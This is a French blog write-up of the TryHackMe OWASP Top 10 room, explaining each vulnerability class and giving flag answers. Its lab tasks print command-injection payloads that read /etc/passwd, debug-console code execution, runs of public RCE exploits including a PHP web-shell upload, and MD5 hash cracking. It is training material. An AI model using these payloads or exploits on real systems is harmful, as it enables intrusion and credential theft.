---
title: "TryHackMe - OWASP Top 10"
date: 2025-10-22 12:10:00 +0200
categories: [TryHackMe, Learning]
tags: [owasp, vulnerabilities, web]
description: "Write-up de la room OWASP top 10 qui nous montrera le top 10 des failles de sécurité web les plus critiques"
image:
  path: /assets/img/posts/tryhackme-owasp-top-10.png
  alt: "OWASP top 10"
---

## Informations sur la room

Cette salle décompose chaque thème OWASP et comprend des détails sur les vulnérabilités, leur origine et la manière dont vous pouvez les exploiter. Vous mettrez la théorie en pratique en relevant les défis proposés.

**Lien :** [OWASP top 10](https://tryhackme.com/room/owasptop102021)

## Objectifs d'apprentissage

Cette room couvre les compétences suivantes :

- Contrôle d'accès défaillant
- Défaillances cryptographiques
- Injection
- Conception non sécurisée
- Mauvaise configuration de la sécurité
- Composants vulnérables et obsolètes
- Défaillances d'identification et d'authentification
- Défaillances de l'intégrité des logiciels et des données
- Défaillances de la journalisation et de la surveillance de la sécurité
- Falsification de requêtes côté serveur (SSRF)

---

## Solutions des tâches

### Task 1 - Introduction

Juste lire ce qu'il y a au dessus, les objectifs, et le reste.

### Task 2 - Accessing Machines

Lancer la machine cible.

### Task 3 - 1. Broken Access Control

Les sites Web comportent des pages protégées contre les visiteurs réguliers. Par exemple, seul l'administrateur du site devrait pouvoir accéder à une page permettant de gérer les autres utilisateurs. Si un visiteur du site Web peut accéder à des pages protégées qu'il n'est pas censé voir, cela signifie que les contrôles d'accès sont défaillants.

Un visiteur régulier pouvant accéder à des pages protégées peut entraîner les conséquences suivantes :

1. Pouvoir consulter des informations sensibles provenant d'autres utilisateurs
2. Accéder à des fonctionnalités non autorisées

En termes simples, un contrôle d'accès défaillant permet aux pirates de **contourner** (bypass) les autorisations, ce qui leur permet de consulter des données sensibles ou d'effectuer des tâches qui ne leur sont pas autorisées.

Par exemple, une vulnérabilité a été découverte en 2019, permettant à un pirate informatique d'obtenir n'importe quelle image d'une vidéo YouTube marquée comme privée. Le chercheur qui a découvert cette vulnérabilité a démontré qu'il pouvait demander plusieurs images et reconstituer en partie la vidéo. Étant donné que lorsqu'un utilisateur marque une vidéo comme privée, il s'attend à ce que personne n'y ait accès, cette vulnérabilité a été considérée comme une faille dans le contrôle d'accès.

### Task 4 - Broken Access Control (IDOR Challenge)

`IDOR` (**Insecure Direct Object Reference**) fait référence à une vulnérabilité du contrôle d'accès qui permet d'accéder à des ressources **normalement invisibles**. Cela se produit lorsque le programmeur expose une référence directe à un objet, qui n'est autre qu'un identifiant renvoyant à des objets spécifiques au sein du serveur. Par objet, on peut entendre un fichier, un utilisateur, un compte bancaire dans une application bancaire, ou n'importe quoi d'autre.

![idor 1](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/0ddb5676eebdb367bff750717268b82b.png)

Ici comme on peut le voir dans l'`URL` il y a un gros problème car l'id correspond au compte donc si on le modifie voici ce qu'il pourrait se passer :

![idor 2](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/42a83d8c119295a79dfcab36b7e4d105.png)

---

**Look at other users' notes. What is the flag?**

J'ai modifié l'URL. Quand on arrive sur la page on tombe sur l'URL avec l'id `1` et quand on incrémente ça ne donne pas grand chose donc j'ai mis `0` et voici ce que ça m'a donné :

**Réponse :** `flag{fivefourthree}`

### Task 5 - 2. Cryptographic Failures

Une **défaillance cryptographique** désigne toute vulnérabilité résultant d'une mauvaise utilisation (ou d'une non-utilisation) des algorithmes cryptographiques destinés à protéger les informations sensibles. Les applications Web ont besoin de la cryptographie pour garantir la confidentialité de leurs utilisateurs à plusieurs niveaux.

### Task 6 - Cryptographic Failures (Supporting Material 1)

La manière la plus courante de stocker une grande quantité de données dans un format facilement accessible depuis de nombreux emplacements consiste à utiliser une base de données. Cela convient parfaitement à une application web, par exemple, car de nombreux utilisateurs peuvent interagir avec le site web à tout moment. Les moteurs de base de données suivent généralement la syntaxe du langage SQL (**Structured Query Language**).

Le format le plus courant (et le plus simple) d'une base de données à fichiers plats est une base de données `SQLite`. Elles peuvent être utilisées dans la plupart des langages de programmation et disposent d'un client dédié pour les interroger en ligne de commande. Ce client s'appelle sqlite3 et est installé par défaut sur de nombreuses distributions Linux.

```bash
user@linux$ ls -l 
-rw-r--r-- 1 user user 8192 Feb  2 20:33 example.db
                                                                                                                                                              
user@linux$ file example.db 
example.db: SQLite 3.x database, last written using SQLite version 3039002, file counter 1, database pages 2, cookie 0x1, schema 4, UTF-8, version-valid-for 1
```

Avec ça on peut vérifier si c'est bien une base de données valide et ensuite on peut entrer dedans avec la commande `sqlite3` :

```bash
user@linux$ sqlite3 example.db                     
SQLite version 3.39.2 2022-07-21 15:24:47
Enter ".help" for usage hints.
sqlite> 
```

On peut ensuite voir les tableaux disponibles avec la commande `.tables` :

```bash
user@linux$ sqlite3 example.db                     
SQLite version 3.39.2 2022-07-21 15:24:47
Enter ".help" for usage hints.
sqlite> .tables
customers
```

On peut aussi utiliser la commande `PRAGMA` pour afficher les infos d'un tableau :

```bash
sqlite> PRAGMA table_info(customers);
0|cudtID|INT|1||1
1|custName|TEXT|1||0
2|creditCard|TEXT|0||0
3|password|TEXT|1||0

sqlite> SELECT * FROM customers;
0|Joy Paulson|4916 9012 2231 7905|5f4dcc3b5aa765d61d8327deb882cf99
1|John Walters|4671 5376 3366 8125|fef08f333cc53594c8097eba1f35726a
2|Lena Abdul|4353 4722 6349 6685|b55ab2470f160c331a99b8d8a1946b19
3|Andrew Miller|4059 8824 0198 5596|bc7b657bd56e4386e3397ca86e378f70
4|Keith Wayman|4972 1604 3381 8885|12e7a36c0710571b3d827992f4cfe679
5|Annett Scholz|5400 1617 6508 1166|e2795fc96af3f4d6288906a90a52a47f
```

Nous avons le custID (0), le custName (Joy Paulson), la `creditCard` (4916 9012 2231 7905) et un hachage de `mot de passe` (5f4dcc3b5aa765d61d8327deb882cf99).

Donc à partir de là on connait le chemin pour retrouver son mot de passe...

Mais bon on est pas là pour refaire le cours de SQL vu précédemment. Si vous voulez aller le consulter et y mettre un commentaire ça me ferait vraiment plaisir !

### Task 7 - Cryptographic Failures (Supporting Material 2)

Dans la tâche précédente, nous avons vu comment interroger une base de données SQLite pour obtenir des données sensibles. Nous avons trouvé une collection de hachages de mots de passe, un pour chaque utilisateur. Dans cette tâche, nous allons brièvement voir comment les cracker.

On nous donne ce site pour pouvoir cracker les mots de passe mais seulement ceux qui ont un hashage faible : [crackstation](https://crackstation.net/)

![crackstation](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/6c4321e296cbf60e4f53417dd7a9146c.png)

Avec le hash récupéré dans la tâche précédente voici ce qu'on peut en faire :

### Task 8 - Cryptographic Failures (Challenge)

Maintenant on doit pratiquer sur l'url suivante : **http://10.10.73.22:81**

**What is the name of the mentioned directory?**

Quand on arrive sur le port 81 on tombe sur une page normale. Si on va dans l'inspecteur rien non plus mais si on clique sur le login ça nous amène sur une autre page et ici dans l'inspecteur on y voit une note :

`<!-- Must remember to do something better with the database than store it in /assets... -->`

**Réponse :** `/assets`

**Navigate to the directory you found in question one. What file stands out as being likely to contain sensitive data?**

**Réponse :** `webapp.db`

**Use the supporting material to access the sensitive data. What is the password hash of the admin user?**

```bash
┌──(omnimessie㉿omnimessie)-[~/Downloads]
└─$ sqlite3 webapp.db       
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
sessions  users   
sqlite> PRAGMA table_info(users);
0|userID|TEXT|1||1
1|username|TEXT|1||0
2|password|TEXT|1||0
3|admin|INT|1||0
sqlite> SELECT * FROM users;
4413096d9c933359b898b6202288a650|admin|6eea9b7ef19179a06954edd0f6c05ceb|1
23023b67a32488588db1e28579ced7ec|Bob|ad0234829205b9033196ba818f7a872b|1
4e8423b514eef575394ff78caed3254d|Alice|268b38ca7b84f44fa0a6cdc86e6301e0|0
sqlite> 
```

**Réponse :** `6eea9b7ef19179a06954edd0f6c05ceb`

**Crack the hash. What is the admin's plaintext password?**

On retourne sur le site qui était donné et voici ce qu'on obtient :

**Réponse :** `qwertyuiop`

**Log in as the admin. What is the flag?**

On retourne sur le site dans la page de login et on entre les identifiants correspondants :

**Réponse :** `THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}`

### Task 9 - 3. Injection 

Les **failles d'injection** sont très courantes dans les applications actuelles. Ces failles surviennent lorsque l'application interprète les entrées contrôlées par l'utilisateur comme des commandes ou des paramètres. Les attaques par injection dépendent des technologies utilisées et de la manière dont celles-ci interprètent les entrées. Voici quelques exemples courants :

- `Injection SQL` : elle se produit lorsque des entrées contrôlées par l'utilisateur sont transmises à des requêtes SQL. Un pirate peut alors transmettre des requêtes SQL afin de **manipuler** le résultat de ces requêtes. Cela pourrait permettre à l'attaquant d'accéder, de **modifier et de supprimer** des informations dans une base de données lorsque ces entrées sont transmises à des requêtes de base de données. Cela signifierait qu'un attaquant pourrait voler des informations sensibles telles que des données personnelles et des identifiants.
- `Injection de commande` : cela se produit lorsque les entrées utilisateur sont transmises à des commandes système. En conséquence, un attaquant peut **exécuter des commandes système** arbitraires sur les serveurs d'applications, ce qui lui permet potentiellement d'accéder aux systèmes des utilisateurs.

### Task 10 - 3.1. Command Injection

L'`injection de commande` se produit lorsque le code côté serveur (comme PHP) d'une application web appelle une fonction qui interagit directement avec la console du serveur. Une vulnérabilité web par injection permet à un pirate d'exploiter cet appel pour exécuter arbitrairement des commandes du système d'exploitation sur le serveur. Les possibilités qui s'offrent alors au pirate sont infinies : il peut lister des fichiers, lire leur contenu, exécuter des commandes de base pour effectuer des reconnaissances sur le serveur ou faire tout ce qu'il veut, comme s'il était assis devant le serveur et saisissait directement des commandes dans la ligne de commande.

Examinons le code qu'ils ont utilisé pour leur application. Essayez de déterminer pourquoi leur implémentation est vulnérable à l'injection de commande. Nous y reviendrons ci-dessous.

```php
<?php
    if (isset($_GET["mooing"])) {
        $mooing = $_GET["mooing"];
        $cow = 'default';

        if(isset($_GET["cow"]))
            $cow = $_GET["cow"];
        
        passthru("perl /usr/bin/cowsay -f $cow $mooing");
    }
?>
```

- Vérification si le paramètre « mooing » est défini. Si c'est le cas, la variable `$mooing` obtient ce qui a été saisi dans le champ de saisie.

- Vérification si le paramètre « cow » est défini. Si c'est le cas, la variable `$cow` obtient ce qui a été transmis via le paramètre.

- Le programme exécute ensuite la fonction `passthru(« perl /usr/bin/cowsay -f $cow $mooing »);`. La fonction passthru exécute simplement une commande dans la console du système d'exploitation et renvoie le résultat au navigateur de l'utilisateur. Vous pouvez voir que notre commande est formée en concaténant les variables $cow et $mooing à la fin de celle-ci. Comme nous pouvons manipuler ces variables, nous pouvons essayer d'injecter des commandes supplémentaires à l'aide d'astuces simples. Si vous le souhaitez, vous pouvez consulter la documentation sur `passthru()` sur le site web de [PHP](https://www.php.net/manual/en/function.passthru.php) pour plus d'informations sur la fonction elle-même.

![PHP](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/8c2e8030730682f9eb1304fa1d81d47a.png)

Exploiter l'**injection de commande**

Maintenant que nous savons comment l'application fonctionne en coulisses, nous allons tirer parti d'une fonctionnalité bash appelée **commandes en ligne** pour exploiter le serveur `cowsay` et exécuter n'importe quelle commande arbitraire de notre choix. Bash vous permet d'exécuter des commandes à l'intérieur d'autres commandes. Cela est utile pour de nombreuses raisons, mais dans notre cas, cela servira à injecter une commande dans le serveur cowsay afin de la faire exécuter.

Pour exécuter des commandes en ligne, il suffit de les encadrer dans le format suivant `$(votre_commande_ici)`. Si la console détecte une commande en ligne, elle l'exécutera d'abord, puis utilisera le résultat comme paramètre pour la commande externe. Regardez l'exemple suivant, qui exécute whoami comme commande en ligne à l'intérieur d'une commande echo :

![injection](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/b7158502a9799698ec0ab29a850c8840.png)

![injection 2](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9f657b909062ac82af12548b4f346aec.png)

---

Maintenant on pratique sur le port `82`

**What strange text file is in the website's root directory?**

Pour executer des commandes on doit mettre `$(ma commande)` et ensuite on peut aller chercher le fichier en question.

**Réponse :** `drpepper.txt`

**How many non-root/non-service/non-daemon users are there?**

`cat /etc/passwd | awk -F: '($3>=1000 && $3<60000) {print $1}'` cette commande trouve tout ce qu'il faut pour cette question, c'est à dire rien.

**Réponse :** `0`

**What user is this app running as?**

**Réponse :** `apache`

**What is the user's shell set as?**

J'ai fait la commande `$(cat /etc/passwd)` et j'ai cherché le nom que me sortait la commande `$(whoami)` c'est à dire **apache** et voici la ligne en question :

```bash
apache:x:100:101:apache:/var/www:/sbin/nologin 
```

**Réponse :** `/sbin/nologin`

**What version of Alpine Linux is running?**

Pour cette question je suis allé voir où se trouvait le fichier alpine pour la version et il se trouve ici `/etc/alpine-release`

**Réponse :** `3.16.0`

### Task 11 - Command Injection Practical

Lisez simplement la description, rien à répondre ici.

### Task 12 - 4. Insecure Design

**Conception non sécurisée**

Une conception non sécurisée fait référence aux **vulnérabilités inhérentes** à l'architecture de l'application. Il ne s'agit pas de vulnérabilités liées à de mauvaises implémentations ou configurations, mais plutôt d'une conception défaillante de l'application (ou d'une partie de celle-ci) dès le départ. La plupart du temps, ces vulnérabilités surviennent lorsqu'une modélisation des menaces inadéquate est effectuée pendant les phases de planification de l'application et se propagent jusqu'à l'application finale. Dans d'autres cas, des vulnérabilités liées à une conception non sécurisée peuvent également être **introduites par les développeurs** lorsqu'ils ajoutent des **raccourcis** dans le code afin de faciliter leurs tests. Un développeur peut, par exemple, désactiver la validation OTP pendant les phases de développement afin de tester rapidement le reste de l'application sans avoir à saisir manuellement un code à chaque connexion, mais oublier de la réactiver lors de la mise en production de l'application.

**Réinitialisation des mots de passe non sécurisés**

Un bon exemple de ce type de vulnérabilité s'est produit il y a quelque temps sur **Instagram**. Instagram permettait aux utilisateurs de réinitialiser leur mot de passe oublié en leur envoyant un code à 6 chiffres sur leur numéro de téléphone portable par SMS à des fins de validation. Si un pirate souhaitait accéder au compte d'une victime, il pouvait essayer de deviner le code à 6 chiffres par force brute. Comme on pouvait s'y attendre, cela n'était pas directement possible, car Instagram avait mis en place une limitation du nombre de tentatives, de sorte qu'après 250 tentatives, l'utilisateur était bloqué et ne pouvait plus essayer.

![insta](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/7e1ca7561c839f350a086a6d739c8a57.png)

Cependant, il a été constaté que la limitation du débit ne s'appliquait qu'aux tentatives de code effectuées à partir de la `même adresse IP`. Si un pirate disposait de plusieurs adresses IP différentes à partir desquelles envoyer des requêtes, il pouvait désormais essayer 250 codes par adresse IP. Pour un code à 6 chiffres, il existe un million de codes possibles. Un pirate aurait donc besoin de 1 000 000/250 = **4 000 adresses** IP pour couvrir tous les codes possibles. Cela peut sembler un nombre incroyable d'adresses IP, mais les services cloud permettent de les obtenir facilement à un coût relativement faible, rendant cette attaque réalisable.

![insta 2](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/6e557475b0db7c4be710f75c24889808.png)

---

Maintenant on va pratiquer sur le port `85`

**What is the value of the flag in joseph's account?**

Je suis allé sur le site et en me connectant sur le compte de `joseph` j'ai fait `forgotten password` et ça m'a demandé des phrases de confirmation du genre **quelle est sa couleur préférée** et j'ai mis plein de couleurs en anglais jusqu'à trouver le bleu.

**Réponse :** `THM{Not_3ven_c4tz_c0uld_sav3_U!}`

### Task 13 - 5. Security Misconfiguration

**Mauvaise configuration de la sécurité**

Les mauvaises configurations de sécurité se distinguent des autres vulnérabilités du Top 10, car elles surviennent alors que la sécurité aurait pu être correctement configurée, mais ne l'a pas été. Même si vous téléchargez la dernière version du logiciel, une mauvaise configuration peut rendre votre installation vulnérable.

Les erreurs de configuration de sécurité comprennent :

- Des autorisations mal configurées sur les services cloud, comme les compartiments S3.
- L'activation de fonctionnalités inutiles, comme des services, des pages, des comptes ou des privilèges.
- Des comptes par défaut avec des mots de passe inchangés.
- Des messages d'erreur trop détaillés qui permettent aux attaquants d'en savoir plus sur le système.
- La non-utilisation d'en-têtes de sécurité HTTP.

**Interfaces de `débogage`**

Une erreur de configuration courante en matière de sécurité concerne l'exposition des fonctionnalités de débogage dans les logiciels de production. Les `fonctionnalités de débogage` sont souvent disponibles dans les frameworks de programmation afin de permettre aux développeurs d'accéder à des fonctionnalités avancées utiles pour déboguer une application **pendant son développement**. Les pirates pourraient exploiter certaines de ces fonctionnalités de débogage si, pour une raison quelconque, les développeurs oubliaient de les désactiver avant de publier leurs applications.

![debug](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/e95fec72ec6881026a67b94c20d6067d.png)

---

Maintenant on se dirige vers le port `86` et plus précisément le port `86/console`

**What is the database file name (the one with the .db extension) in the current directory?**

`import os; print(os.popen("ls -l").read())` ça c'est la commande qu'on doit faire pour executer des commandes bash

```bash
>>> import os; print(os.popen("ls -l").read())
total 24
-rw-r--r--    1 root     root           249 Sep 15  2022 Dockerfile
-rw-r--r--    1 root     root          1411 Feb  3  2023 app.py
-rw-r--r--    1 root     root           137 Sep 15  2022 requirements.txt
drwxr-xr-x    2 root     root          4096 Sep 15  2022 templates
-rw-r--r--    1 root     root          8192 Sep 15  2022 todo.db
```

**Réponse :** `todo.db`

**Modify the code to read the contents of the app.py file, which contains the application's source code. What is the value of the secret_flag variable in the source code?**

J'ai juste fait la commande `cat app.py` et c'était dedans.

**Réponse :** `THM{Just_a_tiny_misconfiguration}`

### Task 14 - 6. Vulnerable and Outdated Components

**Composants vulnérables et obsolètes**

Il peut arriver que l'entreprise ou l'entité que vous testez utilise un programme présentant une vulnérabilité bien connue.

Par exemple, supposons qu'une entreprise n'ait pas mis à jour sa version de WordPress depuis plusieurs années et qu'à l'aide d'un outil tel que `WPScan`, vous découvriez qu'il s'agit de la version 4.6. Une recherche rapide vous permettra de constater que WordPress 4.6 est vulnérable à une exploitation non authentifiée d'exécution de code à distance (RCE) et, mieux encore, vous trouverez une exploitation déjà créée sur `Exploit-DB`.

### Task 15 - Vulnerable and Outdated Components - Exploit

Rappelons que, puisqu'il s'agit de vulnérabilités **connues**, la majeure partie du travail a déjà été effectuée pour nous. Notre tâche principale consiste à trouver les informations relatives au logiciel et à les étudier jusqu'à ce que nous trouvions un exploit. Voyons cela à l'aide d'un exemple d'application web.

![notromo](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/79310c575c9809b1ac8e8546badb2d34.png)

Que savez-vous ? Ce serveur affiche la page par défaut du serveur web Nostromo. Maintenant que nous avons un numéro de version et un nom de logiciel, nous pouvons utiliser [Exploit-DB](https://www.exploit-db.com/) pour essayer de trouver un exploit pour cette version particulière.

![ExploitDB](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/146fb6d0c48ef46d94f124921da171cc.png)

On peut télécharger le script associé et le lancer comme ceci :

```bash
user@linux$ python 47837.py
Traceback (most recent call last):
  File "47837.py", line 10, in <module>
    cve2019_16278.py
NameError: name 'cve2019_16278' is not defined
```

Les exploits que vous téléchargez sur Internet peuvent ne pas fonctionner du premier coup. Il est utile de comprendre le langage de programmation utilisé par le script afin de pouvoir, si nécessaire, corriger les bugs ou apporter des modifications, car **bon nombre de scripts** sur Exploit-DB supposent que vous `apportiez des modifications`.

Heureusement, l'erreur était due à une ligne qui aurait dû être commentée, ce qui la rend facile à corriger.

```bash
# Exploit Title: nostromo 1.9.6 - Remote Code Execution
# Date: 2019-12-31
# Exploit Author: Kr0ff
# Vendor Homepage:
# Software Link: http://www.nazgul.ch/dev/nostromo-1.9.6.tar.gz
# Version: 1.9.6
# Tested on: Debian
# CVE : CVE-2019-16278

cve2019_16278.py  # This line needs to be commented.

#!/usr/bin/env python
```

Maintenant on peut lancer le programme :

```bash
user@linux$ python2 47837.py 127.0.0.1 80 id


                                        _____-2019-16278
        _____  _______    ______   _____\    \
   _____\    \_\      |  |      | /    / |    |
  /     /|     ||     /  /     /|/    /  /___/|
 /     / /____/||\    \  \    |/|    |__ |___|/
|     | |____|/ \ \    \ |    | |       \
|     |  _____   \|     \|    | |     __/ __
|\     \|\    \   |\         /| |\    \  /  \
| \_____\|    |   | \_______/ | | \____\/    |
| |     /____/|    \ |     | /  | |    |____/|
 \|_____|    ||     \|_____|/    \|____|   | |
        |____|/                        |___|/




HTTP/1.1 200 OK
Date: Fri, 03 Feb 2023 04:58:34 GMT
Server: nostromo 1.9.6
Connection: close

uid=1001(_nostromo) gid=1001(_nostromo) groups=1001(_nostromo)
```

Boom ! Nous avons RCE. Il est important de noter que la plupart des scripts vous indiquent les arguments que vous devez fournir. Les développeurs d'exploits vous feront rarement lire des centaines de lignes de code juste pour comprendre comment utiliser le script.

### Task 16 - Vulnerable and Outdated Components - Lab

Maintenant on va pratiquer sur le port `84`

---

**What is the content of the /opt/flag.txt file?**

![site](/assets/img/posts/OWASP-top-10/site.png)

Je constate que le site est fait avec PHP et MYSQL et il s'appelle CSE Bookstore donc je mets ce nom dans exploitDB et voici ce que je trouve :

[exploit-RCE](https://www.exploit-db.com/exploits/47887)

Je décide d'utiliser celui ci car nous ce qu'on cherche se trouve dans `/opt/flag.txt` donc on a besoin d'un nouveau shell pour se connecter à leur machine.

```bash
┌──(omnimessie㉿omnimessie)-[~/Downloads]
└─$ nvim 47887.py 
                                                                                                          
┌──(omnimessie㉿omnimessie)-[~/Downloads]
└─$ chmod 777 47887.py 
                                                                                                          
┌──(omnimessie㉿omnimessie)-[~/Downloads]
└─$ python3 47887.py http://10.10.21.172:84
> Attempting to upload PHP web shell...
> Verifying shell upload...
> Web shell uploaded to http://10.10.21.172:84/bootstrap/img/U4QTRdwOz2.php
> Example command usage: http://10.10.21.172:84/bootstrap/img/U4QTRdwOz2.php?cmd=whoami
> Do you wish to launch a shell here? (y/n): y
RCE $ ls
U4QTRdwOz2.php
android_studio.jpg
beauty_js.jpg
c_14_quick.jpg
c_sharp_6.jpg
doing_good.jpg
img1.jpg
img2.jpg
img3.jpg
kotlin_250x250.png
logic_program.jpg
mobile_app.jpg
pro_asp4.jpg
pro_js.jpg
unnamed.png
web_app_dev.jpg

RCE $ cat /opt/flag.txt
THM{But_1ts_n0t_my_f4ult!}
```

En premier je le télécharge et ensuite je `chmod` le fichier pour qu'il puisse faire des trucs et enfin je l'exécute suivi de l'URL du site ciblé.

**Réponse :** `THM{But_1ts_n0t_my_f4ult!}`

### Task 17 - 7. Identification and Authentication Failures

L'authentification et la gestion des sessions constituent des composants essentiels des applications web modernes. L'**authentification** permet aux utilisateurs d'accéder aux applications web en vérifiant leur identité. La forme d'authentification la plus courante consiste à utiliser un mécanisme de nom d'utilisateur et de mot de passe. L'utilisateur saisit ces informations d'identification, puis le serveur les vérifie. Si elles sont correctes, le serveur fournit alors un cookie de session au navigateur de l'utilisateur. Un cookie de session est nécessaire car les serveurs web utilisent le protocole HTTP(S) pour communiquer, qui est sans état. L'ajout de `cookies de session` permet au serveur de savoir qui envoie quelles données. Le serveur peut alors suivre les actions des utilisateurs.

- Attaques par `force brute` : si une application Web utilise des noms d'utilisateur et des mots de passe, un pirate peut tenter de lancer des attaques par force brute qui lui permettent de deviner le nom d'utilisateur et les mots de passe à l'aide de multiples tentatives d'authentification.

- Utilisation d'`identifiants faibles` : les applications Web doivent définir des politiques de mot de passe fortes. Si les applications permettent aux utilisateurs de définir des mots de passe tels que « motdepasse1 » ou des mots de passe courants, un pirate peut facilement les deviner et accéder aux comptes des utilisateurs.

- `Cookies de session faibles` : les cookies de session permettent au serveur de suivre les utilisateurs. Si les cookies de session contiennent des valeurs prévisibles, les pirates peuvent définir leurs propres cookies de session et accéder aux comptes des utilisateurs.

### Task 18 - Identification and Authentication Failures Practical

Comprenons cela à l'aide d'un exemple : supposons qu'il existe un utilisateur nommé admin et que nous souhaitions accéder à son compte. Nous pouvons alors essayer de réenregistrer ce nom d'utilisateur en y apportant une légère modification. Nous saisirons « `admin` » sans les guillemets (notez l'espace au début). Lorsque vous saisissez cela dans le champ du nom d'utilisateur et que vous entrez les autres informations requises, telles que l'adresse e-mail ou le mot de passe, puis que vous validez ces données, un nouvel utilisateur sera enregistré, mais cet utilisateur aura les mêmes droits que le compte admin. Ce nouvel utilisateur pourra également voir tout le contenu présenté sous l'utilisateur `admin`.

Pour voir cela en action, rendez-vous sur http://10.10.21.172:8088 et essayez de vous inscrire avec le nom d'utilisateur « `darren` ». Vous verrez que cet utilisateur existe déjà, alors essayez plutôt de vous inscrire avec « darren » et vous verrez que vous êtes désormais connecté et que vous pouvez voir le contenu présent uniquement dans le compte de darren, qui dans notre cas, est le drapeau que vous devez récupérer.

---

**What is the flag that you found in darren's account?**

L'astuce en gros c'est qu'au début des usernames on doit mettre un espace pour pouvoir être admin (seulement quand on crée un compte).

**Réponse :** `fe86079416a21a3c99937fea8874b667`

**What is the flag that you found in arthur's account?**

On fait la même chose avec l'utilisateur `arthur`.

**Réponse :** `d9ac0f7db4fda460ac3edeb75d75e16e`

### Task 19 - 8. Software and Data Integrity Failures

**Qu'est-ce que l'intégrité ?**

Lorsque nous parlons d'intégrité, nous faisons référence à notre capacité à vérifier qu'une donnée n'a pas été modifiée. L'intégrité est essentielle en matière de cybersécurité, car nous veillons à ce que les données importantes ne subissent aucune modification indésirable ou malveillante. Imaginons, par exemple, que vous téléchargiez le dernier programme d'installation d'une application. Comment pouvez-vous être sûr que, pendant le téléchargement, il n'a pas été modifié ou **endommagé** par une **erreur de transmission** ?

Pour résoudre ce problème, vous verrez souvent un **hachage** envoyé avec le fichier afin que vous puissiez prouver que le fichier que vous avez téléchargé a conservé son intégrité et n'a pas été modifié pendant le transfert. Un hachage ou un condensé est simplement un nombre qui résulte de l'application d'un algorithme spécifique à une donnée. Lorsque vous vous renseignez sur les algorithmes de hachage, vous entendrez souvent parler de **MD5, SHA1, SHA256** ou de nombreux autres algorithmes disponibles.

Prenons l'exemple de **WinSCP** pour mieux comprendre comment utiliser les hachages pour vérifier l'intégrité d'un fichier. Si vous vous rendez sur leur référentiel [Sourceforge](https://sourceforge.net/projects/winscp/files/WinSCP/5.21.5/), vous verrez que pour chaque fichier disponible au téléchargement, certains hachages sont publiés :

![WinSCP](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/b93dd140259193ee75ae1d12562bbd29.png)

Ces hachages ont été précalculés par les créateurs de **WinSCP** afin que vous puissiez vérifier l'intégrité du fichier après le téléchargement. Si nous téléchargeons le fichier WinSCP-5.21.5-Setup.exe, nous pouvons recalculer les hachages et les comparer à ceux publiés dans Sourceforge. Pour calculer les différents hachages sous Linux, nous pouvons utiliser les commandes suivantes :

```bash
user@attackbox$ md5sum WinSCP-5.21.5-Setup.exe          
20c5329d7fde522338f037a7fe8a84eb  WinSCP-5.21.5-Setup.exe
                                                                    
user@attackbox$ sha1sum WinSCP-5.21.5-Setup.exe 
c55a60799cfa24c1aeffcd2ca609776722e84f1b  WinSCP-5.21.5-Setup.exe
                                                                         
user@attackbox$ sha256sum WinSCP-5.21.5-Setup.exe 
e141e9a1a0094095d5e26077311418a01dac429e68d3ff07a734385eb0172bea  WinSCP-5.21.5-Setup.exe
```

### Task 20 - Software Integrity Failures

**Défaillances liées à l'intégrité des logiciels**

Supposons que vous disposiez d'un site Web qui utilise des bibliothèques tierces stockées sur des serveurs externes échappant à votre contrôle. Bien que cela puisse paraître un peu étrange, il s'agit en réalité d'une pratique assez courante. Prenons l'exemple de **jQuery**, une bibliothèque JavaScript couramment utilisée. Si vous le souhaitez, vous pouvez intégrer **jQuery** à votre site Web directement à partir de leurs serveurs sans avoir à le télécharger, en ajoutant la ligne suivante au code HTML de votre site Web :

```html
<script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
```

![jquery](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/95712e9b375e22a57613a75c6b81384d.png)

La manière correcte d'insérer la bibliothèque dans votre code HTML serait d'utiliser SRI et d'inclure un hachage d'intégrité afin que, si un pirate parvient à modifier la bibliothèque, aucun client naviguant sur votre site web n'exécute la version modifiée. Voici à quoi cela devrait ressembler en HTML :

On peut aller sur ce site pour générer nos propres hash : [srihash.org](https://www.srihash.org/)

```html
<script src="https://code.jquery.com/jquery-3.6.1.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script>
```

---

**What is the `SHA-256` hash of `https://code.jquery.com/jquery-1.12.4.min.js?`**

Je suis allé sur le site du dessus pour vérifier le hash, je l'ai mis en SHA256 et voici ce que ça m'a donné :

```bash
<script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
```

**Réponse :** `sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=`

### Task 21 - Data Integrity Failures

**Échecs de l'intégrité des données**

Pensons à la façon dont les applications Web maintiennent les sessions. Habituellement, lorsqu'un utilisateur se connecte à une application, il se voit attribuer une sorte de jeton de session qui devra être enregistré sur le navigateur aussi longtemps que dure la session. Ce token sera répété à chaque requête ultérieure afin que l'application web sache qui nous sommes. Ces jetons de session peuvent prendre de nombreuses formes mais sont généralement attribués via des cookies. Les cookies sont des paires clé-valeur qu'une application web stocke sur le navigateur de l'utilisateur et qui seront automatiquement répétées à chaque requête adressée au site web qui les a émis.

